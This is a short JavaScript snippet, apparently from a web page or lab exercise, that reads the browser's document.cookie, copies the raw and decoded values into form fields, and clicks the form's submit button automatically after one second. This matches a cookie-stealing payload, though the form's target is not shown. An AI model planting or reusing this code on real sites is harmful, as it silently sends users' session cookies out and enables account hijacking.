function GetCookie() {
	var DecodedCookie = decodeURIComponent(document.cookie);
	var DecodedValue = DecodedCookie;

	document.getElementById("cookie-value").value = document.cookie;
	document.getElementById("decoded-cookie").value = DecodedValue;

	self.SendForm();
}

function SendForm() {
	setTimeout(function () {
		document.getElementById("submit").click();
	}, 1000);
}